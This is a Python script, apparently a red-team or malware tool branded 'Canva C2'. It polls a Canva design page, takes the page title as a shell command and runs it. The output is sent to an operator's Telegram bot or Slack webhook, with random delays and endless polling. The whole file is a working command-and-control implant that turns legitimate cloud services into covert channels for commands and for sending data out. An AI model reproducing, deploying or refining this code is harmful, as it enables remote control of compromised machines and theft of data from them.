import httpx
import re
import shlex
import subprocess
import html
import time
import os
import random
        
url = "https://www.canva.com/design/XXXXXXXXXX/XXXXXXXXXXX/view?embed" #Need to change this

headers = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) "
        "Gecko/20100101 Firefox/152.0"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Sec-GPC": "1",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
}

def banner():
    banner = r"""
  ______                                                ______      _____  
 /      \                                              /      \   /      \ 
/$$$$$$  |  ______   _______   __     __  ______       /$$$$$$  |/$$$$$$  |
$$ |  $$/  /      \ /       \ /  \   /  |/      \      $$ |  $$/ $$____$$ |
$$ |       $$$$$$  |$$$$$$$  |$$  \ /$$/ $$$$$$  |     $$ |       /    $$/ 
$$ |  __  /    $$ |$$ |  $$ | $$  /$$/  /    $$ |      $$ |  __ /$$$$$$/  
$$ \__/  |/$$$$$$$ |$$ |  $$ |  $$ $$/  /$$$$$$$ |     $$ \__/  |$$ |_____ 
$$    $$/ $$    $$ |$$ |  $$ |   $$$/   $$    $$ |     $$    $$/ $$       |
 $$$$$$/   $$$$$$$/ $$/   $$/     $/     $$$$$$$/        $$$$$$/ $$$$$$$$/

            github - https://github.com/jeet-ganguly (follow for more tools/ new research)


"""
    print(banner)

def send_telegram(text):
    try:
        BOT_TOKEN = os.environ["TELEGRAM_BOT_TOKEN"]
        CHAT_ID = os.environ["TELEGRAM_CHAT_ID"]
        BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
        for start in range(0, len(text), 4000):
            chunk = text[start:start + 4000]
            response = httpx.post(
                f"{BASE_URL}/sendMessage",
                json={
                    "chat_id": CHAT_ID,
                    "text": chunk
                },
                timeout=10.0
            )
            return str(response.status_code)
    except KeyError:
        return "keyerror"

def send_slack(text):
    WEBHOOK_URL = "https://hooks.slack.com/services/XXXXXXXXX/XXXXXXXXXX/XXXXXXXX"  #Change this
    CHUNK_SIZE = 3000
    for start in range(0, len(text), CHUNK_SIZE):
        chunk = text[start:start + CHUNK_SIZE]
        response = httpx.post(
            WEBHOOK_URL,
            json={
                "text": f"```\n{chunk}\n```"
            },
            timeout=10.0
        )
        response.raise_for_status()

def request_canva():
    with httpx.Client(http2=True, headers=headers) as client:
        response = client.get(url)
        print("Status:", response.status_code)
        if response.status_code == 200:
            with open('command.log','w') as f:
                f.write(response.text[:500])
            return 1
        else:
            send_slack(str(response.status_code))
            return 0        

def extract_command():
    pattern = re.compile(r"<title>(.*?)</title>")
    text = ""
    with open('command.log','r') as f:
        text = f.read()    
    extract = pattern.findall(text)    
    command = html.unescape(str(extract[0]))
    return command

def run_command(command):
    print("Running command ....",command)    
    time.sleep(5)
    command_line = shlex.split(command)
    process = subprocess.Popen(command_line,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                text=True)
    output, error = process.communicate()
    return output, error

def main():
    req = request_canva()
    if req:
        command = extract_command()
        output, error =  run_command(command)   
        if output:
            random_number = random.randint(5,10)
            print(f"Sending Output after {random_number} seconds....")
            time.sleep(random_number)
            check = send_telegram(output)
            if check != "200":
                send_slack(output)
                print("Output sent via Slack...")
            else:
                print("Output sent via Telegram...")
                pass
        else:
            random_number = random.randint(5,10)
            print(f"Sending Error after {random_number} seconds....")
            time.sleep(random_number)
            check = send_telegram(error)
            if check != "200":
                send_slack(error)
                print("Error sent via Slack...")
            else:
                print("Error sent via Telegram...")
                pass
    else:
        pass

if __name__ == "__main__": 
    banner()
    main()   
    while True:
        random_number = random.randint(30, 60)
        message = f"Polling for command after {random_number} seconds....."
        print(message)
        check = send_telegram(message)
        if check != "200":
            send_slack(message)
            print("Message sent via Slack...")
        else:
            print("Message sent via Telegram...")
            pass
        time.sleep(random_number)
        main()
